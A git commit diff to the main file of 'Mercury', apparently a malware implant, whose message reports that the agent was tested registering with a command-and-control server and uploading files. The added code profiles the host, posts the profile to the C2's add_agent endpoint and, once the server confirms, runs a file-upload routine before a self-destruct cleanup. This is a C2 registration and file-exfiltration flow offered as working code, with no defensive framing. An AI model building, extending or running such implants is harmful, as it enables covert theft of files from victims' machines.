77f17ce35e31175a62fd6c50ef2e5d291c2e20fa
0xConstant <noroh4xy@protonmail.com>
2023-10-04 16:06:46 -0700

    the agent has been fully tested with adding the agent to c2 and uploading files

--- Mercury/main.cpp
+++ Mercury/main.cpp
@@ -3,6 +3,7 @@
 #include "Core/profiler.hpp"
 #include "Communication/google_resolve.hpp"
 #include "Communication/c2_resolve.hpp"
+#include "Communication/addagent.hpp"
 
 
 constexpr bool ONETIMERUN = true;
@@ -19,26 +20,29 @@ void CleanupAndDestroy() {
 
 
 int main() {
-    Profiler();
-
     // Mode 1: run once and then > cleanup > self destruct
-    if (ONETIMERUN) {
-        bool ReachIntranet = googleConn();
-        if (ReachIntranet) {
-            std::wstring C2 = C2Conn(URLS);
+    if (ONETIMERUN) { 
+        bool ReachIntranet = googleConn(); 
+        if (ReachIntranet) { 
+            std::wstring C2 = C2Conn(URLS); 
             if (!C2.empty()) {
-                std::cout << "Running file upload" << std::endl;
-                ProcessFilesAndUpload(C2);
+                std::wstring PC2 = C2 + L"/add_agent";
+                nlohmann::json JsonProfile = Profiler(); 
+                std::string response = SendProfile(PC2, JsonProfile);
+                auto jsonResp = nlohmann::json::parse(response);
+                if (jsonResp.contains("message") && jsonResp["message"] == "created") {
+                    std::cout << "Running file upload" << std::endl;
+                    ProcessFilesAndUpload(C2);
+                }
             }
         }
-        
-        
-        CleanupAndDestroy();
+        CleanupAndDestroy(); 
     }
 
     // This code might never see the light of the day but I gonna keep here anyways...
-    CleanupAndDestroy();
+    CleanupAndDestroy(); 
     
+
     return 0;
 }
 
